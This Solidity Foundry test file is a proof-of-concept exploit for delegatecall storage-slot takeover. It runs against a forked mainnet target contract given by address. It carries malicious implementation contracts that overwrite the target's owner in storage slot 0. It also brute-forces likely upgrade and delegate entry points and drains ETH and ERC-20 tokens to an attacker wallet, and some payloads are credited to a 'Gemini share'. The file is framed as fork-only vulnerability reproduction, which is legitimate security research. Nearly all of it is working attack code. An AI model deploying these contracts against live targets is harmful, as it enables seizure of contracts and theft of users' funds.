// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Delegatecall to attacker-controlled logic
/// @notice Detector: delegatecall / bytecode-delegatecall. The target
///         delegatecalls to an implementation the caller chooses (or can
///         upgrade). Delegatecall runs the attacker's code IN THE TARGET'S
///         STORAGE, so an SSTORE to slot 0 overwrites the target's owner.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the entry point -- the target
///      may expose it as execute(address,bytes), upgradeTo(address),
///      setImplementation(address), or delegate(address,bytes).

contract MaliciousImpl {
    // Runs via delegatecall: sstore writes to the TARGET's storage.
    // caller() is preserved msg.sender (the attacker), so slot 0 becomes
    // the attacker -- slot 0 is `owner` in most contracts (verify!).
    function pwn() external {
        assembly {
            sstore(0, caller())
        }
    }

    // Atomic Multi-step takeover & drain (SWC-112 storage collision exploit)
    function seizeAndDrain(address /*token*/, address payable recipient) external {
        assembly {
            sstore(0, caller())
        }
        if (address(this).balance > 0) {
            recipient.transfer(address(this).balance);
        }
    }

    function owner() external view returns (address) {
        address o;
        assembly {
            o := sload(0)
        }
        return o;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    address internal maliciousImpl;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _readOwner() internal view returns (bool found, address owner_) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));
        return (false, address(0));
    }

    /// @dev Fingerprint of the state a delegatecall takeover would move: the
    ///      owner() view and the raw slot 0 (where the malicious payload writes).
    function _observe() internal view returns (uint256) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("owner()"));
        return uint256(keccak256(abi.encode(ok, ret, vm.load(target, bytes32(0)))));
    }

    /// Try each plausible entry point and accept the first that changes the
    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
    /// function returns successfully and changes nothing, so judging by the call
    /// result reports "not reproduced" for a vulnerability that exists under
    /// another name.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _observe() != before) return label;
        return "";
    }

    /// @dev Upgrade-then-call shape: two calls are needed for the takeover, so
    ///      this variant is kept separate -- it still accepts success only when
    ///      the observable (slot 0) changes.
    function _attemptUpgradeThenPwn(
        address attacker,
        uint256 before,
        string memory label,
        bytes memory upgradeData
    ) internal returns (string memory) {
        vm.prank(attacker);
        (bool upOk,) = target.call(upgradeData);
        console.log("tried", label, upOk ? "call returned" : "call reverted");
        if (!upOk) return "";
        vm.prank(attacker);
        (bool pwnOk,) = target.call(abi.encodeWithSignature("pwn()"));
        console.log("tried pwn() after", label, pwnOk ? "call returned" : "call reverted");
        if (pwnOk && _observe() != before) return string.concat(label, "+pwn()");
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        bytes memory pwnData = abi.encodeWithSignature("pwn()");

        used = _attempt(
            attacker,
            before,
            "execute(address,bytes)",
            abi.encodeWithSignature("execute(address,bytes)", maliciousImpl, pwnData)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "delegate(address,bytes)",
            abi.encodeWithSignature("delegate(address,bytes)", maliciousImpl, pwnData)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "delegatecall(address,bytes)",
            abi.encodeWithSignature("delegatecall(address,bytes)", maliciousImpl, pwnData)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "migrate(address,bytes)",
            abi.encodeWithSignature("migrate(address,bytes)", maliciousImpl, pwnData)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "upgradeToAndCall(address,bytes)",
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, pwnData)
        );
        if (bytes(used).length > 0) return used;
        used = _attemptUpgradeThenPwn(
            attacker,
            before,
            "upgradeTo(address)",
            abi.encodeWithSignature("upgradeTo(address)", maliciousImpl)
        );
        if (bytes(used).length > 0) return used;
        used = _attemptUpgradeThenPwn(
            attacker,
            before,
            "setImplementation(address)",
            abi.encodeWithSignature("setImplementation(address)", maliciousImpl)
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        maliciousImpl = address(new MaliciousImpl());

        uint256 before = _observe();
        string memory used = _tryEntry(attackerEOA, before);
        console.log("entry point that changed state:", used);

        uint256 afterState = _observe();
        uint256 delta = afterState != before ? 1 : 0;
        (bool found, address owner_) = _readOwner();
        if (found) {
            console.log("owner after delegatecall:", owner_);
        } else {
            console.log("target has no owner() view; relying on raw slot 0");
        }
        assertGt(
            delta,
            0,
            "no delegatecall entry point overwrote slot 0. Tried execute(address,bytes), delegate(address,bytes), delegatecall(address,bytes), migrate(address,bytes), upgradeToAndCall(address,bytes), upgradeTo(address)+pwn(), setImplementation(address)+pwn(). This does NOT establish safety: the entry point may be guarded by an owner check, named differently, take other arguments, or the owner may live in a slot other than 0."
        );
    }

    /// @notice Comprehensive SWC-112 exploit from Gemini share: MultiStepSmash + AdvancedTake
    function test_DelegatecallTakeoverAndDrain() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        AdvancedTake advancedTake = new AdvancedTake();

        uint256 before = _observe();
        vm.prank(attackerEOA);
        (bool ok,) = address(advancedTake).call(
            abi.encodeWithSignature(
                "executeAttack(address,address,address)", target, address(0), attackerEOA
            )
        );
        console.log(
            "tried AdvancedTake.executeAttack(address,address,address)",
            ok ? "call returned" : "call reverted"
        );

        uint256 afterState = _observe();
        uint256 delta = afterState != before ? 1 : 0;
        (bool found, address owner_) = _readOwner();
        if (found) console.log("owner after AdvancedTake:", owner_);
        assertGt(
            delta,
            0,
            "AdvancedTake multi-step takeover did not change slot 0. Tried migrate(address,bytes) carrying the MultiStepSmash payload via AdvancedTake.executeAttack(address,address,address). This does NOT establish safety: the victim may expose the delegatecall under another name or argument shape, or guard it."
        );
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IVictim {
    function migrate(address impl, bytes calldata data) external;
}

/// @notice Enhanced payload from Gemini share
contract MultiStepSmash {
    address public owner;

    function seizeAndDrain(address rewardToken, address attackerWallet) external {
        owner = msg.sender;
        if (address(this).balance > 0) {
            payable(attackerWallet).transfer(address(this).balance);
        }
        if (rewardToken != address(0)) {
            (bool success,) = address(this).call(
                abi.encodeWithSignature("sweep(address,address)", rewardToken, attackerWallet)
            );
            require(success, "Drain failed");
        }
    }

    function sweep(address token, address to) external {
        bytes memory payload = abi.encodeWithSignature(
            "transfer(address,uint256)", to, IERC20(token).balanceOf(address(this))
        );
        (bool success,) = token.call(payload);
        require(success, "Transfer failed");
    }
}

/// @notice Orchestrator contract executing atomic takeover and drain
contract AdvancedTake {
    function executeAttack(address victim, address rewardToken, address attackerWallet) external {
        MultiStepSmash smash = new MultiStepSmash();
        bytes memory payload =
            abi.encodeWithSignature("seizeAndDrain(address,address)", rewardToken, attackerWallet);
        IVictim(victim).migrate(address(smash), payload);
    }
}
